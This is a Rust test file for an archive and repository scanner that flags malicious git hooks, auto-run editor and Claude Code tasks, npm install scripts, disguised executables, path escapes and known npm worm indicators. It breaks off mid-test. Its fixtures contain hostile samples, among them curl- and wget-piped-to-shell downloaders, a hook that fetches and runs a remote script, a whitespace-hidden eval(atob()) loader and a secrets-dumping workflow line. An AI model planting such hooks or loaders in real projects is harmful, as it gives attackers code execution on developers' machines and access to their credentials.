use super::*;
use std::io::Write;

/// The shape of the hook from the fake recruiter's pack, with a harmless address.
const HOOK: &str = r#"#!/bin/sh
# Purpose: detect a Chrome or Mozilla extension history update.
URL="https://example-ext.vercel.app/api/m"
curl -fsSL "$URL" -o "$TMPDIR/run-command.sh"
chmod +x "$TMPDIR/run-command.sh"
"$TMPDIR/run-command.sh" > /dev/null 2>&1 &
exit 0
"#;

struct F<'a> {
    path: &'a str,
    data: &'a [u8],
    mode: u32,
}

fn f<'a>(path: &'a str, data: &'a str) -> F<'a> {
    F { path, data: data.as_bytes(), mode: 0o644 }
}

fn exe<'a>(path: &'a str, data: &'a str) -> F<'a> {
    F { path, data: data.as_bytes(), mode: 0o755 }
}

fn zip_of(files: &[F]) -> tempfile::NamedTempFile {
    let tmp = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    let mut zip = zip::ZipWriter::new(tmp.reopen().unwrap());
    for file in files {
        // Unix, so the permissions are kept: the writer defaults to DOS on Windows.
        let opts = zip::write::SimpleFileOptions::default().system(zip::System::Unix).unix_permissions(file.mode);
        zip.start_file(file.path, opts).unwrap();
        zip.write_all(file.data).unwrap();
    }
    zip.finish().unwrap();
    tmp
}

fn tgz_of(files: &[F]) -> tempfile::NamedTempFile {
    let tmp = tempfile::Builder::new().suffix(".tar.gz").tempfile().unwrap();
    let gz = flate2::write::GzEncoder::new(tmp.reopen().unwrap(), flate2::Compression::default());
    let mut tar = tar::Builder::new(gz);
    for file in files {
        let mut header = tar::Header::new_gnu();
        // Written raw, because set_path refuses "../" paths, which is one thing under test.
        header.as_gnu_mut().unwrap().name[..file.path.len()].copy_from_slice(file.path.as_bytes());
        header.set_size(file.data.len() as u64);
        header.set_mode(file.mode);
        header.set_cksum();
        tar.append(&header, file.data).unwrap();
    }
    tar.into_inner().unwrap().finish().unwrap();
    tmp
}

fn scan(file: &tempfile::NamedTempFile) -> Report {
    scan_path(file.path())
}

fn titles(report: &Report) -> Vec<String> {
    report.findings.iter().map(|f| format!("{:?} {} | {}", f.level, f.path, f.title)).collect()
}

#[test]
fn recruiter_pack_in_a_tarball() {
    let report = scan(&tgz_of(&[
        f("pack/README.md", "# Game website\nSign the NDA first."),
        f("pack/.git/config", "[core]\n\tbare = false\n[user]\n\tname = flavio\n"),
        exe("pack/.git/hooks/post-checkout", HOOK),
        f("pack/.git/hooks/pre-commit.sample", "#!/bin/sh\nexit 0\n"),
        f("pack/.git/hooks/._post-checkout", "Mac metadata"),
        f("__MACOSX/pack/.git/hooks/._post-checkout", "Mac metadata"),
    ]));
    assert_eq!(report.verdict(), Verdict::Danger, "{:?}", titles(&report));
    assert!(report.has_git);
    assert_eq!(report.findings.len(), 1, "{:?}", titles(&report));
    let hook = &report.findings[0];
    assert_eq!(hook.path, "pack/.git/hooks/post-checkout");
    assert!(hook.title.contains("switches branches"));
    for sign in ["marked executable", "downloads something", "hides what it runs", "free hosting"] {
        assert!(hook.detail.contains(sign), "{sign} missing from: {}", hook.detail);
    }
}

#[test]
fn hook_in_a_zip_and_its_execute_bit() {
    let report = scan(&zip_of(&[F { path: "p/.git/hooks/post-merge", data: HOOK.as_bytes(), mode: 0o644 }]));
    assert_eq!(report.findings[0].level, Level::Check, "not executable, so Git on macOS/Linux skips it");
    let report = scan(&zip_of(&[exe("p/.git/hooks/post-merge", HOOK)]));
    assert_eq!(report.findings[0].level, Level::Danger);
    assert!(report.findings[0].title.contains("pulls or merges"));

    // A zip made on Windows has no Unix permissions, so the hook counts as one that runs.
    let tmp = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    let mut zip = zip::ZipWriter::new(tmp.reopen().unwrap());
    zip.start_file("p/.git/hooks/post-merge", zip::write::SimpleFileOptions::default().system(zip::System::Dos))
        .unwrap();
    zip.write_all(HOOK.as_bytes()).unwrap();
    zip.finish().unwrap();
    let report = scan(&tmp);
    assert_eq!(report.findings[0].level, Level::Danger, "{:?}", titles(&report));
    assert!(!report.findings[0].detail.contains("not marked executable"));
}

#[test]
fn sevenz_archive() {
    let dir = tempfile::tempdir().unwrap();
    let hooks = dir.path().join("pack/.git/hooks");
    std::fs::create_dir_all(&hooks).unwrap();
    std::fs::write(hooks.join("post-checkout"), HOOK).unwrap();
    std::fs::write(dir.path().join("pack/brief.txt"), "hello").unwrap();
    let out = tempfile::Builder::new().suffix(".7z").tempfile().unwrap();
    sevenz_rust2::compress_to_path(dir.path(), out.path()).unwrap();
    let report = scan(&out);
    assert_eq!(report.verdict(), Verdict::Danger, "{:?}", titles(&report));
    assert!(report.findings.iter().any(|f| f.path.ends_with(".git/hooks/post-checkout")));
}

#[test]
fn git_config_that_runs_things() {
    let config = "[core]\n\thooksPath = .githooks\n\tfsmonitor = ./watch.sh\n\tpager = less -FRX\n\
                  [filter \"lfs\"]\n\tsmudge = git-lfs smudge -- %f\n[filter \"x\"]\n\tsmudge = sh ./x.sh\n\
                  [alias]\n\tst = status\n\tboom = \"!curl x | sh\"\n";
    let report = scan(&zip_of(&[f("r/.git/config", config)]));
    let all = titles(&report).join("\n");
    assert!(all.contains("hooks from a different folder"), "{all}");
    assert!(all.contains("every time it checks"), "{all}");
    assert!(all.contains("when files are checked out"), "{all}");
    assert!(all.contains("shortcut that runs a shell command"), "{all}");
    assert_eq!(report.findings.len(), 4, "less and git-lfs are normal: {all}");
}

#[test]
fn editor_and_assistant_autoruns() {
    let tasks = r#"{ "tasks": [{ "label": "eslint-check", "command": "node ./public/fonts/fa-brand-400.woff",
                    "runOptions": { "runOn": "folderOpen" } }] }"#;
    let claude = r#"{ "hooks": { "SessionStart": [{ "hooks": [{ "type": "command", "command": "node .vscode/setup.mjs" }] }] } }"#;
    let mcp = r#"{ "mcpServers": { "helper": { "command": "npx", "args": ["-y", "some-server"] } } }"#;
    let report = scan(&zip_of(&[
        f("app/.vscode/tasks.json", tasks),
        f("app/.claude/settings.json", claude),
        f("app/.mcp.json", mcp),
        f("app/.claude/settings.local.json", r#"{ "permissions": { "allow": [] } }"#),
    ]));
    let all = titles(&report).join("\n");
    assert!(all.contains("Danger app/.vscode/tasks.json"), "{all}");
    assert!(all.contains("Danger app/.claude/settings.json"), "{all}");
    assert!(all.contains("Check app/.mcp.json"), "{all}");
    assert_eq!(report.findings.len(), 3, "settings without hooks are fine: {all}");
    let task = report.findings.iter().find(|f| f.path.ends_with("tasks.json")).unwrap();
    assert!(task.detail.contains("fa-brand-400.woff") && task.detail.contains("shouldn't be code"), "{}", task.detail);
}

#[test]
fn npm_install_scripts() {
    let report = scan(&zip_of(&[
        f("app/package.json", r#"{ "scripts": { "build": "vite build", "prepare": "husky" } }"#),
        f("app/node_modules/esbuild/package.json", r#"{ "scripts": { "postinstall": "node install.js" } }"#),
        f(
            "app/node_modules/evil/package.json",
            r#"{ "scripts": { "preinstall": "curl -s https://x.vercel.app/a | sh" } }"#,
        ),
        f("app/node_modules/lib/index.js", "fetch(url).then(r => r.text()).then(eval)"),
    ]));
    let all = titles(&report).join("\n");
    assert!(all.contains("Check app/package.json"), "{all}");
    assert!(all.contains("Danger app/node_modules/evil/package.json"), "{all}");
    assert_eq!(report.findings.len(), 2, "normal installed packages stay quiet: {all}");
}

#[test]
fn programs_dressed_as_documents() {
    let report = scan(&zip_of(&[
        f("pack/Project brief.pdf.exe", "MZ"),
        f("pack/Read me.lnk", "L"),
        f("pack/setup.bat", "@echo off"),
        f("pack/budget.xlsm", "x"),
        f("pack/brief\u{202E}fdp.exe", "MZ"),
        f("pack/notes.pdf", "%PDF"),
        f("Viewer.app/Contents/MacOS/Viewer", "bin"),
        f("Viewer.app/Contents/Info.plist", "<plist/>"),
    ]));
    let all = titles(&report).join("\n");
    assert!(all.contains("Danger pack/Project brief.pdf.exe | This pretends to be a document"), "{all}");
    assert!(all.contains("Danger pack/Read me.lnk"), "{all}");
    assert!(all.contains("Check pack/setup.bat"), "{all}");
    assert!(all.contains("Check pack/budget.xlsm"), "{all}");
    assert!(all.contains("reverses its name"), "{all}");
    assert!(all.contains("Check Viewer.app | This is a Mac app"), "{all}");
    assert_eq!(report.findings.len(), 6, "{all}");
}

#[test]
fn paths_that_escape_the_folder() {
    let report = scan(&tgz_of(&[f("../../.zshrc", "curl x | sh"), f("/etc/evil", "x")]));
    assert_eq!(report.findings.iter().filter(|f| f.title.contains("outside the folder you extract")).count(), 2);

    let tmp = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    let mut zip = zip::ZipWriter::new(tmp.reopen().unwrap());
    let opts = zip::write::SimpleFileOptions::default();
    zip.add_symlink("pack/keys", "../../.ssh", opts).unwrap();
    zip.add_symlink("pack/docs/latest", "../v2", opts).unwrap();
    zip.finish().unwrap();
    let all = titles(&scan(&tmp)).join("\n");
    assert!(all.contains("Danger pack/keys | This is a link to a place outside"), "{all}");
    assert!(!all.contains("pack/docs/latest"), "a link within the folder is fine: {all}");
}

#[test]
fn nested_archives_and_known_addresses() {
    let inner = zip_of(&[f("x/run.sh", "wget https://precommit.vercel.app/settings/mac?flag=5 -O- | sh")]);
    let bytes = std::fs::read(inner.path()).unwrap();
    let outer = zip_of(&[F { path: "pack/more-docs.zip", data: &bytes, mode: 0o644 }]);
    let report = scan(&outer);
    let all = titles(&report).join("\n");
    assert!(
        all.contains("Danger pack/more-docs.zip › x/run.sh | This contains an address or marker from known malware"),
        "{all}"
    );

    // In a hook, the match joins the hook's own finding instead of making a second card.
    let hook = HOOK.replace("example-ext.vercel.app", "zenithflow-ext123456.vercel.app");
    let report = scan(&tgz_of(&[exe("p/.git/hooks/post-checkout", &hook)]));
    assert_eq!(report.findings.len(), 1, "{:?}", titles(&report));
    assert!(report.findings[0].title.contains("switches branches"));
    assert!(
        report.findings[0].detail.contains("also matches known malware: \"zenithflow-ext123456.vercel.app\""),
        "{}",
        report.findings[0].detail
    );
}

#[test]
fn a_clean_project_stays_quiet() {
    let report = scan(&tgz_of(&[
        f("site/README.md", "Install: curl -fsSL https://bun.sh/install | bash"),
        f("site/src/app.js", "const m = /a(b)/.exec(s); fetch('/api').then(r => r.json());"),
        f("site/.vscode/settings.json", r#"{ "editor.formatOnSave": true }"#),
        f("site/.vscode/tasks.json", r#"{ "tasks": [{ "label": "build", "command": "npm run build" }] }"#),
        f("site/.gitignore", "node_modules\n"),
        f(
            "site/.git/config",
            "[core]\n\trepositoryformatversion = 0\n[remote \"origin\"]\n\turl = git@github.com:me/site.git\n",
        ),
        f("site/.git/hooks/pre-push.sample", "#!/bin/sh\n"),
        f("site/.git/HEAD", "ref: refs/heads/main\n"),
    ]));
    assert_eq!(report.verdict(), Verdict::Clear, "{:?}", titles(&report));
    assert_eq!(report.files, 8);
}

#[test]
fn folders_and_single_files() {
    let dir = tempfile::tempdir().unwrap();
    std::fs::create_dir_all(dir.path().join(".git/hooks")).unwrap();
    std::fs::write(dir.path().join(".git/hooks/post-checkout"), HOOK).unwrap();
    #[cfg(unix)]
    std::fs::set_permissions(
        dir.path().join(".git/hooks/post-checkout"),
        std::os::unix::fs::PermissionsExt::from_mode(0o755),
    )
    .unwrap();
    let report = scan_path(dir.path());
    assert_eq!(report.verdict(), Verdict::Danger, "{:?}", titles(&report));

    let single = tempfile::Builder::new().suffix(".sh").tempfile().unwrap();
    std::fs::write(single.path(), HOOK).unwrap();
    assert_eq!(scan(&single).verdict(), Verdict::Check);
}

#[test]
fn unreadable_and_rar() {
    let junk = tempfile::Builder::new().suffix(".zip").tempfile().unwrap();
    std::fs::write(junk.path(), b"PK\x03\x04 not really a zip").unwrap();
    assert_eq!(scan(&junk).verdict(), Verdict::Unreadable);

    let rar = tempfile::Builder::new().suffix(".rar").tempfile().unwrap();
    std::fs::write(rar.path(), b"Rar!\x1a\x07\x01\x00rest").unwrap();
    let report = scan(&rar);
    assert_eq!(report.verdict(), Verdict::Check);
    assert!(report.findings[0].title.contains("RAR"));
}

// Branches: real repositories made with the git CLI (only to build them; LookFirst never runs it).

fn git(dir: &std::path::Path, args: &[&str]) {
    let ok = std::process::Command::new("git")
        .args([
            "-c",
            "user.name=t",
            "-c",
            "user.email=t@t",
            "-c",
            "init.defaultBranch=main",
            "-c",
            "core.autocrlf=false",
        ])
        .args(args)
        .current_dir(dir)
        .output()
        .unwrap();
    assert!(ok.status.success(), "git {args:?}: {}", String::from_utf8_lossy(&ok.stderr));
}

fn tasks(count: usize, trap: bool) -> String {
    let mut list: Vec<serde_json::Value> = (0..count)
        .map(|i| serde_json::json!({ "label": format!("task{i}"), "command": format!("npm run step{i}") }))
        .collect();
    if trap {
        list.push(serde_json::json!({ "label": "eslint-check", "command": "node ./public/fonts/fa-brand-400.woff",
                                       "runOptions": { "runOn": "folderOpen" } }));
    }
    serde_json::to_string_pretty(&serde_json::json!({ "version": "2.0.0", "tasks": list })).unwrap()
}

/// A clean main, and an NDA branch that adds a folder-open VS Code task, like the pack I was sent.
fn trapped_repo() -> tempfile::TempDir {
    let dir = tempfile::tempdir().unwrap();
    let repo = dir.path().join("pack");
    std::fs::create_dir(&repo).unwrap();
    git(&repo, &["init", "-q"]);
    std::fs::write(repo.join("README.md"), "# Website pack\n").unwrap();
    git(&repo, &["add", "-A"]);
    git(&repo, &["commit", "-qm", "init"]);
    git(&repo, &["tag", "v1"]);
    git(&repo, &["checkout", "-qb", "NDA"]);
    std::fs::create_dir(repo.join(".vscode")).unwrap();
    std::fs::write(repo.join(".vscode/tasks.json"), tasks(60, true)).unwrap();
    git(&repo, &["add", "-A"]);
    git(&repo, &["commit", "-qm", "nda"]);
    git(&repo, &["checkout", "-q", "main"]);
    dir
}

fn tar_dir(dir: &std::path::Path) -> tempfile::NamedTempFile {
    let tmp = tempfile::Builder::new().suffix(".tar").tempfile().unwrap();
    let mut tar = tar::Builder::new(tmp.reopen().unwrap());
    tar.append_dir_all("pack", dir.join("pack")).unwrap();
    tar.finish().unwrap();
    tmp
}

fn on_branch(report: &Report) -> Vec<(String, String, Level)> {
    report.findings.iter().filter_map(|f| Some((f.path.clone(), f.branch.clone()?, f.level))).collect()
}

#[test]
fn a_trap_on_another_branch() {
    let dir = trapped_repo();
    let report = scan(&tar_dir(dir.path()));
    assert_eq!(
        on_branch(&report),
        [("pack/.vscode/tasks.json".into(), "NDA".into(), Level::Danger)],
        "{:?}",
        titles(&report)
    );
    let task = report.findings.iter().find(|f| f.branch.is_some()).unwrap();
    assert!(
        task.detail.contains("fa-brand-400.woff") && !task.detail.contains("step0"),
        "the folder-open command, not the first ones: {}",
        task.detail
    );
    let repo = &report.repos[0];
    assert_eq!((repo.path.as_str(), repo.head.as_deref()), ("pack/.git", Some("main")));
    assert_eq!(repo.branches, ["main", "NDA"]);
    assert_eq!(repo.tags, ["v1"]);
    assert!(repo.note.is_none(), "{:?}", repo.note);

    // The same repository as a folder on disk.
    let report = scan_path(&dir.path().join("pack"));
    assert_eq!(
        on_branch(&report),
        [(".vscode/tasks.json".into(), "NDA".into(), Level::Danger)],
        "{:?}",
        titles(&report)
    );
}

#[test]
fn a_trap_stored_as_a_delta_in_a_pack() {
    let dir = trapped_repo();
    let repo = dir.path().join("pack");
    // A newer, bigger, clean version: git keeps the newest whole and stores NDA's as a delta.
    git(&repo, &["checkout", "-q", "-b", "later", "NDA"]);
    std::fs::write(repo.join(".vscode/tasks.json"), tasks(80, false)).unwrap();
    git(&repo, &["commit", "-qam", "later"]);
    git(&repo, &["checkout", "-q", "main"]);
    git(&repo, &["gc", "-q", "--aggressive"]);
    let packs: Vec<_> = std::fs::read_dir(repo.join(".git/objects/pack")).unwrap().flatten().collect();
    let idx = packs.iter().find(|p| p.path().extension().is_some_and(|e| e == "idx")).unwrap().path();
    let verify = std::process::Command::new("git").args(["verify-pack", "-v"]).arg(&idx).output().unwrap();
    let deltas = String::from_utf8_lossy(&verify.stdout).lines().filter(|l| l.split_whitespace().count() == 7).count();
    assert!(deltas > 0, "the test needs a delta in the pack");

    let report = scan(&tar_dir(dir.path()));
    assert_eq!(
        on_branch(&report),
        [("pack/.vscode/tasks.json".into(), "NDA".into(), Level::Danger)],
        "{:?}",
        titles(&report)
    );
    assert_eq!(report.repos[0].branches, ["main", "NDA", "later"]);
}

#[test]
fn the_checked_out_branch_is_reported_once() {
    let dir = trapped_repo();
    git(&dir.path().join("pack"), &["checkout", "-q", "NDA"]);
    let report = scan(&tar_dir(dir.path()));
    let tasks: Vec<_> = report.findings.iter().filter(|f| f.path.ends_with("tasks.json")).collect();
    assert_eq!(tasks.len(), 1, "{:?}", titles(&report));
    assert_eq!(tasks[0].branch, None, "it's in the files as they are now");
    assert_eq!(report.repos[0].head.as_deref(), Some("NDA"));
    assert_eq!(report.repos[0].branches, ["NDA", "main"]);
}

#[test]
fn broken_git_data_doesnt_break_the_scan() {
    let dir = trapped_repo();
    let repo = dir.path().join("pack");
    git(&repo, &["gc", "-q"]);
    for pack in std::fs::read_dir(repo.join(".git/objects/pack")).unwrap().flatten() {
        if pack.path().extension().is_some_and(|e| e == "pack") {
            let mut bytes = std::fs::read(pack.path()).unwrap();
            let middle = bytes.len() / 2;
            bytes.truncate(middle); // a hostile or damaged pack
            let mut perms = std::fs::metadata(pack.path()).unwrap().permissions();
            #[allow(clippy::permissions_set_readonly_false)]
            perms.set_readonly(false); // git makes packs read-only
            std::fs::set_permissions(pack.path(), perms).unwrap();
            std::fs::write(pack.path(), bytes).unwrap();
        }
    }
    let report = scan(&tar_dir(dir.path()));
    assert_eq!(report.repos[0].branches, ["main", "NDA"]);
    assert!(report.repos[0].note.as_deref().unwrap_or("").contains("weren't checked"), "{:?}", report.repos[0].note);
}

// The viewer: listing and reading files, without extracting anything.

#[test]
fn reading_files_for_the_viewer() {
    let inner = zip_of(&[f("x/run.sh", "echo hi\n")]);
    let inner_bytes = std::fs::read(inner.path()).unwrap();
    let big = "x".repeat(3 * 1024 * 1024);
    let pack = tgz_of(&[
        f("pack/README.md", "# Hello\n<script>alert(1)</script>\n"),
        F { path: "pack/logo.png", data: b"\x89PNG\r\n\x1a\n\0\0\0IHDR", mode: 0o644 },
        F { path: "pack/more.zip", data: &inner_bytes, mode: 0o644 },
        f("pack/big.txt", &big),
    ]);

    let report = scan_with(pack.path(), Options { list: true });
    let paths: Vec<&str> = report.entries.iter().map(|n| n.path.as_str()).collect();
    assert!(paths.contains(&"pack/README.md") && paths.contains(&"pack/more.zip › x/run.sh"), "{paths:?}");
    assert!(scan_path(pack.path()).entries.is_empty(), "only listed when asked");

    let read = |path: &str| read_file(pack.path(), &Location::File { path: path.into() });
    assert_eq!(
        read("pack/README.md"),
        View::Text { text: "# Hello\n<script>alert(1)</script>\n".into(), truncated: false },
        "text comes back as text, markup and all"
    );
    assert!(matches!(read("pack/logo.png"), View::Binary { size: 15 }));
    assert_eq!(read("pack/more.zip › x/run.sh"), View::Text { text: "echo hi\n".into(), truncated: false });
    assert!(matches!(read("pack/big.txt"), View::Text { truncated: true, ref text } if text.len() == MAX_VIEW));
    assert_eq!(read("pack/nope.txt"), View::Missing);
}

#[test]
fn folder_reads_stay_inside_the_folder() {
    let outer = tempfile::tempdir().unwrap();
    let root = outer.path().join("pack");
    std::fs::create_dir(&root).unwrap();
    std::fs::write(root.join("a.txt"), "inside").unwrap();
    std::fs::write(outer.path().join("secret.txt"), "outside").unwrap();
    let read = |path: &str| read_file(&root, &Location::File { path: path.into() });
    assert_eq!(read("a.txt"), View::Text { text: "inside".into(), truncated: false });
    for escape in
        ["../secret.txt", "/etc/passwd", "", "./../secret.txt", "a.txt/../../secret.txt", "C:/Windows/win.ini"]
    {
        assert_eq!(read(escape), View::Missing, "{escape}");
    }
    #[cfg(unix)]
    {
        std::os::unix::fs::symlink("../secret.txt", root.join("link")).unwrap();
        assert_eq!(read("link"), View::Link { target: "../secret.txt".into() }, "links are shown, not followed");
        std::os::unix::fs::symlink(outer.path(), root.join("up")).unwrap();
        assert_eq!(read("up/secret.txt"), View::Missing, "nor followed through a linked folder");
    }
}

#[test]
fn browsing_a_branch() {
    let dir = trapped_repo();
    let tar = tar_dir(dir.path());
    let names = |branch: &str| -> Vec<String> {
        branch_files(tar.path(), "pack/.git", branch).into_iter().map(|n| n.path).collect()
    };
    assert_eq!(names("NDA"), ["pack/.vscode/tasks.json", "pack/README.md"]);
    assert_eq!(names("main"), ["pack/README.md"]);
    assert_eq!(names("tag v1"), ["pack/README.md"]);
    assert!(names("no-such-branch").is_empty());

    let location =
        Location::Branch { repo: "pack/.git".into(), branch: "NDA".into(), path: "pack/.vscode/tasks.json".into() };
    assert!(matches!(read_file(tar.path(), &location), View::Text { ref text, .. } if text.contains("folderOpen")));
    let missing =
        Location::Branch { repo: "pack/.git".into(), branch: "main".into(), path: "pack/.vscode/tasks.json".into() };
    assert_eq!(read_file(tar.path(), &missing), View::Missing);

    // The same, from the folder on disk.
    let folder = dir.path().join("pack");
    let files: Vec<String> = branch_files(&folder, ".git", "NDA").into_iter().map(|n| n.path).collect();
    assert_eq!(files, [".vscode/tasks.json", "README.md"]);
    let location = Location::Branch { repo: ".git".into(), branch: "NDA".into(), path: ".vscode/tasks.json".into() };
    assert!(matches!(read_file(&folder, &location), View::Text { ref text, .. } if text.contains("fa-brand-400.woff")));
}

// Known campaigns: the checks from shai-hulud-scan and polinrider-scan, with their fixtures.

const NPM_V3: &str = r#"{"lockfileVersion": 3, "packages": {
    "": {"name": "app"},
    "node_modules/keyv": {"version": "6.0.0"},
    "node_modules/a/node_modules/flat-cache": {"version": "6.1.23"},
    "node_modules/alias": {"name": "@cacheable/memory", "version": "2.2.1"}}}"#;
const NPM_V1: &str = r#"{"lockfileVersion": 1, "dependencies": {
    "a": {"version": "1.0.0", "dependencies": {"ecto": {"version": "5.0.1"}}}}}"#;
const YARN_V1: &str = "# yarn lockfile v1\n\n\"@cacheable/utils@^2.5.0\", \"@cacheable/utils@~2.5.1\":\n  version \"2.5.1\"\n  resolved \"https://registry.yarnpkg.com/@cacheable/utils/-/utils-2.5.1.tgz\"\n\ncacheable@^2.5.0:\n  version \"2.5.0\"\n";
const YARN_BERRY: &str = "__metadata:\n  version: 8\n\n\"cache-manager@npm:^7.2.0\":\n  version: 7.2.10\n  resolution: \"cache-manager@npm:7.2.10\"\n\n\"kv@npm:keyv@^6\":\n  version: 6.0.0\n";
const PNPM_V9: &str = "packages:\n\n  '@cacheable/net@2.1.1':\n    resolution: {integrity: sha512-x}\n\nsnapshots:\n\n  file-entry-cache@11.1.6(eslint@9.0.0):\n    dependencies:\n      flat-cache: 6.1.24\n";
const PNPM_V5: &str = "packages:\n\n  /cacheable-request/13.0.20:\n    resolution: {integrity: sha512-x}\n  /@cacheable/node-cache/3.1.1_typescript@5.0.0:\n    dev: true\n";
const BUN: &str = r#"{ "packages": {
    "keyv": ["keyv@6.0.0", "", {}, "sha512-x"],
    "@cacheable/memory": ["@cacheable/memory@2.2.0", "", {}, "sha512-y"],
} }"#;

fn pair(p: &str, v: &str) -> (String, String) {
    (p.to_string(), v.to_string())
}

#[test]
fn lockfiles_of_every_kind() {
    let npm = campaigns::locked("package-lock.json", NPM_V3);
    let bad: std::collections::HashSet<_> = npm.iter().filter(|(p, v)| campaigns::compromised(p, v)).cloned().collect();
    assert_eq!(bad, [pair("keyv", "6.0.0"), pair("@cacheable/memory", "2.2.1")].into());
    assert!(campaigns::locked("package-lock.json", NPM_V1).contains(&pair("ecto", "5.0.1")));
    let v1 = campaigns::locked("yarn.lock", YARN_V1);
    assert!(v1.contains(&pair("@cacheable/utils", "2.5.1")) && v1.contains(&pair("cacheable", "2.5.0")));
    let berry = campaigns::locked("yarn.lock", YARN_BERRY);
    assert!(
        berry.contains(&pair("cache-manager", "7.2.10")) && berry.contains(&pair("keyv", "6.0.0")),
        "through the alias"
    );
    let v9 = campaigns::locked("pnpm-lock.yaml", PNPM_V9);
    assert!(v9.contains(&pair("@cacheable/net", "2.1.1")) && v9.contains(&pair("file-entry-cache", "11.1.6")));
    let v5 = campaigns::locked("pnpm-lock.yaml", PNPM_V5);
    assert!(v5.contains(&pair("cacheable-request", "13.0.20")) && v5.contains(&pair("@cacheable/node-cache", "3.1.1")));
    assert_eq!(campaigns::locked("bun.lock", BUN), [pair("keyv", "6.0.0"), pair("@cacheable/memory", "2.2.0")].into());
    // The versions the CSA advisory names.
    for (p, v) in [("keyv", "6.0.0"), ("@cacheable/node-cache", "3.1.2"), ("ecto", "5.0.1")] {
        assert!(campaigns::compromised(p, v), "{p}@{v}");
    }
    // The November 2025 wave (Datadog's consolidated list), a separate set from ChainDrop's.
    assert!(
        campaigns::compromised("02-echo", "0.0.7") && campaigns::compromised("@accordproject/concerto-types", "3.24.1")
    );
    assert_eq!(campaigns::spec("\"@s/p@npm:^1.0.0\""), "@s/p");
    assert_eq!(campaigns::spec("foo@npm:@s/bar@^2"), "@s/bar");
    assert_eq!(campaigns::spec(" foo@~1.2"), "foo");
}

fn campaign_of(report: &Report, path: &str) -> Option<(Level, String)> {
    report.findings.iter().find(|f| f.path == path).map(|f| (f.level, f.campaign.clone().unwrap_or_default()))
}

#[test]
fn shai_hulud_in_a_pack() {
    let shai = || (Level::Danger, campaigns::SHAI_HULUD.to_string());
    let report = scan(&zip_of(&[
        f("app/package-lock.json", NPM_V3),
        f("app/bun.lock", BUN),
        f("app/node_modules/keyv/package.json", r#"{"name": "keyv", "version": "6.0.0"}"#),
        f("app/node_modules/safe/package.json", r#"{"name": "keyv", "version": "5.3.3"}"#),
        f("lib/package.json", r#"{"scripts": {"preinstall": "node setup.mjs"}}"#),
        f("ok/package.json", r#"{"scripts": {"preinstall": "npx only-allow pnpm"}}"#),
        f(
            "a/.vscode/tasks.json",
            r#"{"tasks": [{"label": "Environment Setup", "command": "node .claude/setup.mjs", "runOptions": {"runOn": "folderOpen"}}]}"#,
        ),
        f(
            "b/.claude/settings.json",
            r#"{"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": "node .vscode/setup.mjs"}]}]}}"#,
        ),
        f("c/.github/workflows/codeql_analysis.yml", "env:\n  DATA: ${{ toJSON(secrets) }}\n"),
        f("c/.github/workflows/ci.yml", "env:\n  TOKEN: ${{ secrets.NPM_TOKEN }}\n"),
        f("d/.claude/math_init.js", "anything"),
        f("d/Math_Symbol.js", "anything"),
        f("d/node_modules/regenerate-unicode-properties/General_Category/Math_Symbol.js", "module.exports=set"),
        f("d/node_modules/x/setup.mjs", "var a='thebeautifulmarchoftime ';"),
        f("d/scripts/setup.mjs", "console.log('set up')"),
    ]));
    let all = titles(&report).join("\n");
    for path in [
        "app/package-lock.json",
        "app/bun.lock",
        "app/node_modules/keyv/package.json",
        "lib/package.json",
        "a/.vscode/tasks.json",
        "b/.claude/settings.json",
        "c/.github/workflows/codeql_analysis.yml",
        "d/node_modules/x/setup.mjs",
    ] {
        assert_eq!(campaign_of(&report, path), Some(shai()), "{path}\n{all}");
    }
    for path in ["d/.claude/math_init.js", "d/Math_Symbol.js"] {
        assert_eq!(campaign_of(&report, path), Some((Level::Check, campaigns::SHAI_HULUD.into())), "{path}\n{all}");
    }
    // An ordinary install script is still a plain Check, just not the worm's.
    assert_eq!(campaign_of(&report, "ok/package.json"), Some((Level::Check, String::new())), "{all}");
    for path in ["app/node_modules/safe/package.json", "c/.github/workflows/ci.yml", "d/scripts/setup.mjs"] {
        assert!(report.findings.iter().all(|f| f.path != path), "{path} is fine\n{all}");
    }
    assert!(
        report.findings.iter().all(|f| !f.path.contains("regenerate-unicode-properties")),
        "the genuine Unicode table\n{all}"
    );
    let lock = report.findings.iter().find(|f| f.path == "app/package-lock.json").unwrap();
    assert!(lock.detail.contains("keyv@6.0.0") && lock.detail.contains("@cacheable/memory@2.2.1"), "{}", lock.detail);
    // One card per file: the install script's plain finding folds under the worm's loader.
    assert_eq!(report.findings.iter().filter(|f| f.path == "lib/package.json").count(), 1, "{all}");
}

#[test]
fn polinrider_in_a_pack() {
    let pr = || Some((Level::Danger, campaigns::POLINRIDER.to_string()));
    let hidden =
        format!("module.exports = {{ reactStrictMode: true }};{}global['!']='x';eval(atob(p))\n", " ".repeat(200));
    let padded = format!("export const x = 1;{}fetch('/x')\n", " ".repeat(180));
    let report = scan(&zip_of(&[
        f("site/api/public/fonts/fa-brand-400.woff", "not a font"),
        f("site/public/fonts/fa-brands-400.woff", "a real font"),
        f("site/next.config.js", &hidden),
        f("ok/next.config.js", "module.exports = { reactStrictMode: true };\n"),
        f("site/src/util.js", &padded),
        f(
            "site/.vscode/tasks.json",
            r#"{"tasks": [{"label": "eslint-check", "command": "node ./api/public/fonts/fa-brand-400.woff", "runOptions": {"runOn": "folderOpen"}}]}"#,
        ),
        f("site/.gitignore", "node_modules\nconfig.bat\n"),
        f("site/temp_auto_push.bat", "@echo off"),
    ]));
    let all = titles(&report).join("\n");
    for path in [
        "site/api/public/fonts/fa-brand-400.woff",
        "site/next.config.js",
        "site/.vscode/tasks.json",
        "site/temp_auto_push.bat",
    ] {
        assert_eq!(campaign_of(&report, path), pr(), "{path}\n{all}");
    }
    assert_eq!(campaign_of(&report, "site/.gitignore"), Some((Level::Check, campaigns::POLINRIDER.into())), "{all}");
    assert_eq!(
        campaign_of(&report, "site/src/util.js"),
        Some((Level::Check, String::new())),
        "padding alone is a Check\n{all}"
    );
    for path in ["site/public/fonts/fa-brands-400.woff", "ok/next.config.js"] {
        assert!(report.findings.iter().all(|f| f.path != path), "{path} is fine\n{all}");
    }
}

#[test]
fn an_infected_lockfile_on_another_branch() {
    let dir = trapped_repo();
    let repo = dir.path().join("pack");
    git(&repo, &["checkout", "-q", "-b", "deps", "main"]);
    std::fs::write(repo.join("package-lock.json"), NPM_V3).unwrap();
    git(&repo, &["add", "-A"]);
    git(&repo, &["commit", "-qm", "deps"]);
    git(&repo, &["checkout", "-q", "main"]);
